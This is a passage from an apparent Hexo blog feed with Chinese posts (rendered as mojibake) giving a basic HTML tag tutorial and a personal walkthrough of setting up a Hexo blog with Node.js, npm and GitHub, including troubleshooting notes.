class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br></code></pre></td></tr></table></figure><blockquote><p> <code>&lt;br&gt;</code>æ ‡ç­¾æ²¡æœ‰ç»“æŸæ ‡ç­¾</p></blockquote><h3 id="é“¾æ¥"><a href="#é“¾æ¥" class="headerlink" title="é“¾æ¥"></a>é“¾æ¥</h3><p>é€šè¿‡ &lt;a&gt; æ ‡ç­¾è¿›è¡Œå®šä¹‰çš„ã€‚</p><p>åŒå¼•å·å†…ä¸ºè·³è½¬é“¾æ¥ï¼Œä¸€å¯¹æ ‡ç­¾ä¸­é—´çš„æ–‡æœ¬ä¸ºé¡µé¢å±•ç¤ºæ–‡æœ¬ã€‚</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;https://shmodifier.github.io/&quot;</span>&gt;</span>æˆ‘çš„åšå®¢<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="å›¾åƒ"><a href="#å›¾åƒ" class="headerlink" title="å›¾åƒ"></a>å›¾åƒ</h3><p>é€šè¿‡ &lt;img&gt; æ ‡ç­¾è¿›è¡Œå®šä¹‰çš„ã€‚</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;å›¾ç‰‡æ–‡ä»¶è·¯å¾„&quot;</span> <span class="hljs-attr">width</span>=<span class="hljs-string">&quot;[å›¾ç‰‡å®½]&quot;</span> <span class="hljs-attr">height</span>=<span class="hljs-string">&quot;[å›¾ç‰‡é«˜]&quot;</span> /&gt;</span><br></code></pre></td></tr></table></figure><h1 id="HTMLå±æ€§"><a href="#HTMLå±æ€§" class="headerlink" title="HTMLå±æ€§"></a>HTMLå±æ€§</h1><p>å±æ€§åœ¨ HTML å…ƒç´ çš„<strong>å¼€å§‹æ ‡ç­¾</strong>ä¸­è§„å®šï¼Œä¾›äº†æœ‰å…³ HTML å…ƒç´ çš„æ›´å¤šçš„ä¿¡æ¯ã€‚</p><p>å±æ€§å€¼åº”è¯¥å§‹ç»ˆè¢«åŒ…æ‹¬åœ¨å¼•å·å†…ã€‚åŒå¼•å·æ˜¯æœ€å¸¸ç”¨çš„ï¼Œä¸è¿‡ä½¿ç”¨å•å¼•å·ä¹Ÿæ²¡æœ‰é—®é¢˜ã€‚åœ¨æŸäº›ä¸ªåˆ«çš„æƒ…å†µä¸‹ï¼Œæ¯”å¦‚å±æ€§å€¼æœ¬èº«å°±å«æœ‰åŒå¼•å·ï¼Œé‚£ä¹ˆå¿…é¡»ä½¿ç”¨å•å¼•å·ã€‚</p><p>å®ä¾‹ï¼š</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">h1</span> <span class="hljs-attr">align</span>=<span class="hljs-string">&quot;center&quot;</span>&gt;</span> å±…ä¸­æ’åˆ—æ ‡é¢˜<br></code></pre></td></tr></table></figure><h1 id="å¤„ç†æ–‡æœ¬"><a href="#å¤„ç†æ–‡æœ¬" class="headerlink" title="å¤„ç†æ–‡æœ¬"></a>å¤„ç†æ–‡æœ¬</h1><h5 id="æ ¼å¼åŒ–æ ‡ç­¾"><a href="#æ ¼å¼åŒ–æ ‡ç­¾" class="headerlink" title="æ ¼å¼åŒ–æ ‡ç­¾"></a>æ ¼å¼åŒ–æ ‡ç­¾</h5><p>åœ¨htmlä»£ç ä¸­,å¯å•ç‹¬ä½¿ç”¨ä¹Ÿå¯å’Œå…¶ä»–æ ‡ç­¾åŒæ—¶ä½¿ç”¨</p><table><thead><tr><th>æ ‡ç­¾</th><th>æè¿°</th></tr></thead><tbody><tr><td>&lt;b&gt;æˆ–&lt;strong&gt;</td><td>å®šä¹‰ç²—ä½“</td></tr><tr><td>&lt;em&gt;æˆ–&lt;i&gt;</td><td>å®šä¹‰æ–œä½“</td></tr><tr><td>&lt;samall&gt;</td><td>å®šä¹‰å°å·å­—</td></tr><tr><td>&lt;sub&gt;</td><td>å®šä¹‰ä¸‹æ ‡å­—</td></tr><tr><td>&lt;sup&gt;</td><td>å®šä¹‰ä¸Šæ ‡å­—</td></tr><tr><td>&lt;ins&gt;</td><td>å®šä¹‰ä¸‹åˆ’çº¿</td></tr><tr><td>&lt;del&gt;</td><td>å®šä¹‰åˆ é™¤çº¿</td></tr></tbody></table><p>eg:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>è¾“å‡ºæ¼”ç¤º<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">hr</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">ins</span>&gt;</span>ä¸‹åˆ’çº¿æ¼”ç¤º<span class="hljs-tag">&lt;/<span class="hljs-name">ins</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>ä¸Šä¸‹æ ‡æ¼”ç¤ºæ®µè½<span class="hljs-tag">&lt;<span class="hljs-name">sup</span>&gt;</span>ä¸‹æ ‡æ¼”ç¤º<span class="hljs-tag">&lt;/<span class="hljs-name">sup</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>ä¸Šä¸‹æ ‡æ¼”ç¤ºæ®µè½<span class="hljs-tag">&lt;<span class="hljs-name">sub</span>&gt;</span>ä¸Šæ ‡æ¼”ç¤º<span class="hljs-tag">&lt;/<span class="hljs-name">sub</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">strong</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">em</span>&gt;</span>ç²—ä½“æ–œä½“å åŠ æ¼”ç¤º<span class="hljs-tag">&lt;/<span class="hljs-name">em</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">strong</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">small</span>&gt;</span>å°å­—ä½“æ¼”ç¤º<span class="hljs-tag">&lt;/<span class="hljs-name">small</span>&gt;</span><br></code></pre></td></tr></table></figure><p><img src="/img/HTML%E8%B6%85%E6%96%87%E6%9C%AC%E6%A0%87%E8%AE%B0%E8%AF%AD%E8%A8%80/Snipaste_2023-01-16_21-20-04.png"></p><h1 id="HTMLé“¾æ¥"><a href="#HTMLé“¾æ¥" class="headerlink" title="HTMLé“¾æ¥"></a>HTMLé“¾æ¥</h1><p>ä½¿ç”¨æ ‡ç­¾ &lt;a&gt;æ¥è®¾ç½®è¶…æ–‡æœ¬é“¾æ¥ã€‚</p><p>è¶…é“¾æ¥å¯ä»¥æ˜¯ä¸€ä¸ªå­—ï¼Œä¸€ä¸ªè¯ï¼Œæˆ–è€…ä¸€ç»„è¯ï¼Œä¹Ÿå¯ä»¥æ˜¯ä¸€å¹…å›¾åƒã€‚</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;[url]&quot;</span>&gt;</span>é“¾æ¥æ–‡æœ¬<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br></code></pre></td></tr></table></figure><blockquote><p>href å±æ€§æè¿°äº†é“¾æ¥çš„ç›®æ ‡ã€‚.</p></blockquote><h3 id="targetå±æ€§"><a href="#targetå±æ€§" class="headerlink" title="targetå±æ€§"></a>targetå±æ€§</h3><p>ä½¿ç”¨ target å±æ€§ï¼Œå¯ä»¥å®šä¹‰è¢«é“¾æ¥çš„æ–‡æ¡£åœ¨ä½•å¤„æ˜¾ç¤ºã€‚</p><p><code>_blank</code>è¡¨ç¤ºåœ¨æ–°çª—å£æ‰“å¼€æ–‡æ¡£</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs HTML"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;[url]&quot;</span> <span class="hljs-attr">target</span>=<span class="hljs-string">&quot;_blank&quot;</span>&gt;</span>é“¾æ¥æ–‡æœ¬<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="idå±æ€§"><a href="#idå±æ€§" class="headerlink" title="idå±æ€§"></a>idå±æ€§</h3><p>id å±æ€§å¯ç”¨äºåˆ›å»ºä¸€ä¸ª HTML æ–‡æ¡£ä¹¦ç­¾ã€‚</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>è¾“å‡ºæ¼”ç¤º<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">hr</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;tips&quot;</span>&gt;</span>æ ‡ç­¾æ¼”ç¤º<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#tips&quot;</span>&gt;</span>è·³è½¬åˆ°æ ‡ç­¾æ¼”ç¤º<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;[ç½‘é¡µåœ°å€]/#tips&quot;</span>&gt;</span>è·³è½¬åˆ°æ ‡ç­¾æ¼”ç¤º<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span> <br><span class="hljs-comment">&lt;!--è¿æ¥åˆ°å¤–éƒ¨ç½‘é¡µçš„æ ‡ç­¾--&gt;</span><br></code></pre></td></tr></table></figure><p><img src="/img/HTML%E8%B6%85%E6%96%87%E6%9C%AC%E6%A0%87%E8%AE%B0%E8%AF%AD%E8%A8%80/Snipaste_2023-01-19_16-19-47.png"></p><h1 id="å¤´éƒ¨-lt-head-gt"><a href="#å¤´éƒ¨-lt-head-gt" class="headerlink" title="å¤´éƒ¨&lt;head&gt;"></a>å¤´éƒ¨&lt;head&gt;</h1><p>å¯ä»¥æ·»åŠ åœ¨å¤´éƒ¨åŒºåŸŸçš„å…ƒç´ æ ‡ç­¾ä¸º: &lt;title&gt;, &lt;style&gt;, &lt;meta&gt;, &lt;link&gt;, &lt;script&gt;, &lt;noscript&gt; å’Œ &lt;base&gt;ã€‚</p><h3 id="lt-title-gt"><a href="#lt-title-gt" class="headerlink" title="&lt;title&gt;"></a>&lt;title&gt;</h3><p><code>&lt;title&gt;</code> æ ‡ç­¾å®šä¹‰äº†ä¸åŒæ–‡æ¡£çš„æ ‡é¢˜ã€‚&lt;title&gt; åœ¨ HTML&#x2F;XHTML æ–‡æ¡£ä¸­æ˜¯å¿…éœ€çš„ã€‚</p><blockquote><p>æ˜¾ç¤ºåœ¨æ”¶è—å¤¹ä¸­çš„æ ‡é¢˜ã€æ˜¾ç¤ºåœ¨æœç´¢å¼•æ“ç»“æœé¡µé¢çš„æ ‡é¢˜ä»¥åŠæµè§ˆå™¨å·¥å…·æ çš„æ ‡é¢˜ã€‚</p></blockquote><h3 id="lt-base-gt"><a href="#lt-base-gt" class="headerlink" title="&lt;base&gt;"></a>&lt;base&gt;</h3><p><code>&lt;base&gt;</code> æ ‡ç­¾æè¿°äº†åŸºæœ¬çš„<strong>é“¾æ¥åœ°å€&#x2F;é“¾æ¥ç›®æ ‡</strong>ï¼Œè¯¥æ ‡ç­¾ä½œä¸ºHTMLæ–‡æ¡£ä¸­æ‰€æœ‰çš„é“¾æ¥æ ‡ç­¾çš„é»˜è®¤é“¾æ¥ã€‚</p><p>eg:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">base</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;[url]&quot;</span> <span class="hljs-attr">target</span>=<span class="hljs-string">&quot;_blank&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="lt-link-gt"><a href="#lt-link-gt" class="headerlink" title="&lt;link&gt;"></a>&lt;link&gt;</h3><p><code>&lt;link&gt;</code> æ ‡ç­¾å®šä¹‰äº†æ–‡æ¡£ä¸<strong>å¤–éƒ¨èµ„æº</strong>ä¹‹é—´çš„å…³ç³»ï¼Œé€šå¸¸ç”¨äºé“¾æ¥åˆ°æ ·å¼è¡¨ã€‚</p><h3 id="lt-style-gt"><a href="#lt-style-gt" class="headerlink" title="&lt;style&gt;"></a>&lt;style&gt;</h3><p>&lt;style&gt; æ ‡ç­¾å®šä¹‰äº†HTMLæ–‡æ¡£çš„æ ·å¼æ–‡ä»¶å¼•ç”¨åœ°å€.</p><h3 id="lt-meta-gt"><a href="#lt-meta-gt" class="headerlink" title="&lt;meta&gt;"></a>&lt;meta&gt;</h3><p>&lt;meta&gt; å…ƒç´ é€šå¸¸ç”¨äºæŒ‡å®šç½‘é¡µçš„æè¿°ï¼Œå…³é”®è¯ï¼Œæ–‡ä»¶çš„æœ€åä¿®æ”¹æ—¶é—´ï¼Œä½œè€…ï¼Œå’Œå…¶ä»–<strong>å…ƒæ•°æ®</strong>ã€‚</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs HTML">ä¸ºæœç´¢å¼•æ“å®šä¹‰å…³é”®è¯ï¼š<br><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;keywords&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;HTML, CSS, XML, XHTML, JavaScript&quot;</span>&gt;</span><br>ä¸ºç½‘é¡µå®šä¹‰æè¿°å†…å®¹:<br><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;description&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;å…è´¹ Web &amp; ç¼–ç¨‹ æ•™ç¨‹&quot;</span>&gt;</span><br>å®šä¹‰ç½‘é¡µä½œè€…:<br><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;author&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;Runoob&quot;</span>&gt;</span><br>æ¯30ç§’é’Ÿåˆ·æ–°å½“å‰é¡µé¢:<br><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">&quot;refresh&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;30&quot;</span>&gt;</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Knowledge</tag>
      
      <tag>HTML</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ä¸€èµ·æ¥æ­åšå®¢</title>
    <link href="/2023/01/07/%E4%B8%80%E8%B5%B7%E6%9D%A5%E6%90%AD%E5%8D%9A%E5%AE%A2/"/>
    <url>/2023/01/07/%E4%B8%80%E8%B5%B7%E6%9D%A5%E6%90%AD%E5%8D%9A%E5%AE%A2/</url>
    
    <content type="html"><![CDATA[<p>åˆ©ç”¨hexo+GitHubæ­å»ºä¸€ä¸ªå±äºè‡ªå·±çš„åšå®¢</p><span id="more"></span><p>åˆåï¼šæˆ‘æ€ä¹ˆä»€ä¹ˆéƒ½ä¸ä¼šä¹‹è¸©å‘è®°å½•ğŸ¥€</p><p>å»ºè®®åœ¨powershellæ‰§è¡Œå‘½ä»¤ï¼Œcmdæœ‰äº›æ­¥éª¤ä¼šæç¤ºæƒé™ä¸å¤Ÿ</p><p>â€è¸©å‘â€œéƒ¨åˆ†éƒ½æ˜¯é‡åˆ°çš„é—®é¢˜å’Œåæ§½çš„ç¢ç¢å¿µï¼Œå¦‚æœåœ¨è¿‡ç¨‹ä¸­æ²¡æœ‰é‡åˆ°é—®é¢˜å°±ä¸ç”¨çœ‹ğŸ¥°</p><h2 id="gitä¸‹è½½"><a href="#gitä¸‹è½½" class="headerlink" title="gitä¸‹è½½"></a>gitä¸‹è½½</h2><p>è¿™é‡Œæš‚æ—¶å…ˆé»˜è®¤æœ‰gitï¼Œå› ä¸ºå½“æ—¶æ­åšå®¢çš„ä¹‹å‰å°±æœ‰ç”¨åˆ°gitäº†ã€‚</p><p>ç­‰æˆ‘æœ‰ç©ºè¡¥ä¸ŠğŸ˜‡</p><h2 id="node-jsä¸‹çš„Hexoå®‰è£…å’Œæ¢æº"><a href="#node-jsä¸‹çš„Hexoå®‰è£…å’Œæ¢æº" class="headerlink" title="node.jsä¸‹çš„Hexoå®‰è£…å’Œæ¢æº"></a>node.jsä¸‹çš„Hexoå®‰è£…å’Œæ¢æº</h2><h4 id="node-jså®‰è£…"><a href="#node-jså®‰è£…" class="headerlink" title="node.jså®‰è£…"></a>node.jså®‰è£…</h4><p>é¦–å…ˆéœ€è¦ç»™ç”µè„‘å®‰è£…ä¸€ä¸ªnode.js</p><p><a href="https://nodejs.org/en/download/">ä¸‹è½½é“¾æ¥</a></p><p>æˆ‘å½“æ—¶è¿˜æ²¡æœ‰è®°ç¬”è®°çš„ä¹ æƒ¯æ‰€ä»¥nodeä¸‹è½½å’Œé…ç½®è¿™é‡Œæ²¡æœ‰ç¬”è®°</p><p>å¯ä»¥çœ‹çœ‹èœé¸Ÿæ•™ç¨‹è®²çš„å¾ˆè¯¦ç»†äº†</p><p><a href="https://www.runoob.com/nodejs/nodejs-install-setup.html">Node.js å®‰è£…é…ç½® | èœé¸Ÿæ•™ç¨‹ (runoob.com)</a></p><h4 id="æ¢æº"><a href="#æ¢æº" class="headerlink" title="æ¢æº"></a>æ¢æº</h4><p>ç»™node.jsæ¢ä¸€ä¸ªæ·˜å®é•œåƒï¼Œä¸ç„¶æ¥ä¸‹æ¥ä¸‹è½½hexoä¼štimeoutã€‚</p><p>ç›´æ¥æ‰“å¼€power shellè¾“å…¥ä»¥ä¸‹å‘½ä»¤ï¼š</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">npm config <span class="hljs-built_in">set</span> registry https://registry.npm.taobao.org<br></code></pre></td></tr></table></figure><p>æ—¶é—´ä¼šæ¯”è¾ƒé•¿å¯ä»¥ä¸‹æ¥¼è·‘ä¸ªä¸¤å…¬é‡Œ</p><h4 id="Hexoå®‰è£…"><a href="#Hexoå®‰è£…" class="headerlink" title="Hexoå®‰è£…"></a>Hexoå®‰è£…</h4><p>powershellè¾“å…¥</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">npm install <span class="hljs-literal">-g</span> hexo<span class="hljs-literal">-cli</span><br></code></pre></td></tr></table></figure><p>æ¢æºä»¥åä¸‹è½½é€Ÿåº¦è´¼å¿«</p><h4 id="è¸©å‘"><a href="#è¸©å‘" class="headerlink" title="è¸©å‘"></a>è¸©å‘</h4><p>ï¼ˆæ¥ä¸‹æ¥æ˜¯ä¸é‡è¦çš„ç¢ç¢å¿µå¯ä»¥ç›´æ¥è·³è¿‡çœ‹ä¸‹ä¸€è¶´ï¼‰</p><p>æœ€å¼€å§‹çœ‹çš„æ•™ç¨‹è¯´è¦ä¿®æ”¹ç¯å¢ƒå˜é‡ï¼Œä¿®æ”¹äº†å¤§åŠå¤©ã€‚æ‰§è¡Œnpm installçš„æ—¶å€™ä¸€ç›´æŠ¥é”™ï¼Œä¸€æ°”ä¹‹ä¸‹æŠŠnodeæ‰€æœ‰æ–‡ä»¶éƒ½åˆ äº†ï¼Œé‡æ–°ä¸‹è½½ã€‚</p><p><del>(åˆ«å­¦æˆ‘ï¼Œé‡åˆ°æŠ¥é”™è¦æ‰¾é—®é¢˜åŸå› è€Œä¸æ˜¯é€ƒé¿)</del></p><blockquote><p>å¤§åŠå¤œä¸‹è½½ä¸åŠ¨å¯»æ±‚å·å¸ˆå‚…å¸®å¿™ï¼Œå·å‘ç°æˆ‘çš„ä»£ç†åœ°å€æ²¡æ›´æ–°ï¼Œç‹ ç‹ æ‹–åè…¿ã€‚ğŸ¥²</p></blockquote><p>é‡æ–°ä¸‹è½½ä¹‹åä¿æŒè‡ªåŠ¨é…ç½®çš„ç¯å¢ƒå˜é‡ä¸å˜ï¼Œåœ¨å‘½ä»¤è¡Œé‡Œç›´æ¥npm installå‘ç°è¿˜æ˜¯æŠ¥ä»¥å‰ä¸€æ ·çš„é”™ã€‚</p><p><img src="/img/%E4%B8%80%E8%B5%B7%E6%9D%A5%E6%90%AD%E5%8D%9A%E5%AE%A2/Snipaste_2022-12-08_11-01-33.png"></p><p>å¤åˆ¶ç™¾åº¦å‘ç°æ˜¯æƒé™ä¸å¤Ÿï¼Œè¦ç”¨ç®¡ç†å‘˜æ–¹å¼æ‰§è¡Œå‘½ä»¤ã€‚</p><blockquote><p>æ‰€ä»¥æˆ‘ç™½åˆ äº†å‘—ï¼ï¼</p></blockquote><p>win+Ræ‰“å¼€ç®¡ç†å‘˜æ–¹å¼ç»ˆç«¯ï¼Œå†æ¬¡è¾“å…¥æ˜¾ç¤ºtimeoutã€‚</p><p><img src="/img/%E4%B8%80%E8%B5%B7%E6%9D%A5%E6%90%AD%E5%8D%9A%E5%AE%A2/Snipaste_2022-12-08_10-59-37.png"></p><p>åˆç™¾åº¦å‘ç°éœ€è¦æ¢æºã€‚</p><p>ç›´æ¥ä»ç½‘ä¸Šæ‰¾äº†ä¸ªç°æˆçš„æ·˜å®æºï¼Œæ¢å¥½ä»¥åå†installäº”ç§’æˆåŠŸã€‚</p><p><img src="/img/%E4%B8%80%E8%B5%B7%E6%9D%A5%E6%90%AD%E5%8D%9A%E5%AE%A2/Snipaste_2022-12-08_11-02-39.png"></p><h2 id="Hexoçš„ç½‘é¡µé…ç½®"><a href="#Hexoçš„ç½‘é¡µé…ç½®" class="headerlink" title="Hexoçš„ç½‘é¡µé…ç½®"></a>Hexoçš„ç½‘é¡µé…ç½®</h2><p>ä¸‹è½½åè¾“å…¥</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">hexo init blog<br></code></pre></td></tr></table></figure><p>è¿™ä¸ªå‘½ä»¤å°±æ˜¯åœ¨powershellå½“å‰çš„æ ¹ç›®å½•ä¸‹æ–°å»ºä¸€ä¸ªåä¸ºblogçš„æ–‡ä»¶å¤¹ï¼Œç”¨äºåç»­é…ç½®æ–‡ä»¶çš„å­˜æ”¾ã€‚</p><p>[<em>blog</em>]å¥½åƒå¯ä»¥å¡«åˆ«çš„æ–‡ä»¶åï¼Œä½†æˆ‘æ²¡è¯•è¿‡æ‰€ä»¥ä¸å»ºè®®ã€‚</p><p><img src="/img/%E4%B8%80%E8%B5%B7%E6%9D%A5%E6%90%AD%E5%8D%9A%E5%AE%A2/Snipaste_2022-12-08_20-25-14.png"></p><p>å»ºå¥½æ–‡ä»¶å¤¹ä¹‹ååˆå§‹åŒ–é…ç½®</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">cd <span class="hljs-keyword">blog </span>  <span class="hljs-comment">#è¿›å…¥blogæ–‡ä»¶å¤¹</span><br>npm <span class="hljs-keyword">install </span>   <br></code></pre></td></tr></table></figure><p>è¿™ä¸ªå‘½ä»¤ç»“æŸä»¥åå°±å¯ä»¥çœ‹åˆ°blogæ–‡ä»¶å¤¹é‡Œæœ‰å¾ˆå¤šæ–‡ä»¶å–½ï¼Œç±»ä¼¼äºä¸‹å›¾è¿™æ ·ã€‚</p><p>å›¾ç‰‡é‡Œæœ‰äº›æ–‡ä»¶ä½ æ²¡æœ‰ä¹Ÿæ²¡å…³ç³»ï¼Œå› ä¸ºè¿™æ˜¯æˆ‘å»ºæˆåšå®¢åˆä¸‹è½½äº†å¾ˆå¤šä¸œè¥¿ä¹‹åè¡¥æˆªçš„å›¾ã€‚ğŸ˜³</p><p><img src="/img/%E4%B8%80%E8%B5%B7%E6%9D%A5%E6%90%AD%E5%8D%9A%E5%AE%A2/Snipaste_2023-03-13_21-01-30.png"></p><p>ä¸¤æ¡å‘½ä»¤ç”Ÿæˆç½‘é¡µ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">hexo generate<br>hexo server<br></code></pre></td></tr></table></figure><p>å½“ç„¶å–½hexoå–„è§£äººæ„åœ°æ”¯æŒç®€å†™ï¼Œå¯ä»¥ç›´æ¥è¾“å…¥ <code>hexo g</code>å’Œ<code>hexo s</code></p><p>ç”¨æµè§ˆå™¨é¢„è§ˆç½‘å€<a href="http://localhost:4000/">http://localhost:4000</a></p><p>å› ä¸ºæˆ‘ä»¬è¿˜æ²¡é…ç½®GitHubæ‰€ä»¥è¿™ä¸ªæ—¶å€™å°±æ˜¯Hexoæœ€åŸºç¡€çš„ä¸‘é™‹é¡µé¢ã€‚</p><h4 id="è¸©å‘-1"><a href="#è¸©å‘-1" class="headerlink" title="è¸©å‘"></a>è¸©å‘</h4><p>cmdé‡Œè¾“å…¥hexoå‘½ä»¤ååˆæŠ¥é”™</p><p>è¯´hexoä¸æ˜¯å¯ä»¥æ‰§è¡Œçš„å‘½ä»¤ï¼Œç™¾åº¦åå‘ç°æ˜¯ç¯å¢ƒå˜é‡çš„é—®é¢˜ï¼Œ<del>è¯¥æ­»çš„ç¯å¢ƒå˜é‡</del></p><p>å‘ç°hexo-cliçš„binç›®å½•ä¸‹æ²¡æœ‰.cmdçš„æ–‡ä»¶ï¼Œä½†æ˜¯å‰ä¸€ä¸ªç›®å½•é‡Œæœ‰ï¼Œå°±ç›´æ¥å¤åˆ¶è¿‡æ¥ï¼ŒåˆæŠŠbinæ·»åŠ åˆ°äº†ç¯å¢ƒå˜é‡é‡Œï¼Œå†hexo init</p><p>è¿è¡ŒæˆåŠŸä½†æŠ¥é”™ï¼Œ<del>æƒ³æ­»</del></p><p><img src="/img/%E4%B8%80%E8%B5%B7%E6%9D%A5%E6%90%AD%E5%8D%9A%E5%AE%A2/Snipaste_2022-12-08_12-29-06.png"></p><p>æ®è¯´æ˜¯å› ä¸ºç›®å½•ä¸‹æ²¡æœ‰è¿™ä¸ªæ–‡ä»¶å¤¹ï¼Œ<del>ä¸ºä»€ä¹ˆåº”è¯¥æœ‰hexoçš„æ–‡ä»¶å¤¹å•Š</del></p><p>æ¢ä¸ªæ€è·¯ï¼Œç”¨ç®¡ç†å‘˜æ¨¡å¼é‡æ–°ä¸‹è½½hexoï¼ˆæˆ‘å°±ä¸ªé‡åˆ°å›°éš¾å¸è½½åˆ é™¤çš„èœé¸¡ğŸ˜¶â€ğŸŒ«ï¸</p><p>ä¸‹è½½åè¿è¡Œ<code>hexo init blog</code></p><p><img src="/img/%E4%B8%80%E8%B5%B7%E6%9D%A5%E6%90%AD%E5%8D%9A%E5%AE%A2/Snipaste_2022-12-08_20-24-15.png"></p><p>åˆä¸€æ¬¡å‘ä¸‡èƒ½çš„äº’è”ç½‘æ±‚åŠ©ï¼Œä¿®æ”¹äº†ä¸€ä¸‹power shellçš„æƒé™ï¼Œå†è¿è¡Œ</p><p><img src="/img/%E4%B8%80%E8%B5%B7%E6%9D%A5%E6%90%AD%E5%8D%9A%E5%AE%A2/Snipaste_2022-12-08_20-25-14.png"></p><p>æˆåŠŸï¼ˆï¼Ÿï¼Ÿï¼‰</p><blockquote><p>ç®¡ç†å‘˜æ¨¡å¼yyds</p></blockquote><h2 id="GitHubé…ç½®ç½‘é¡µ"><a href="#GitHubé…ç½®ç½‘é¡µ" 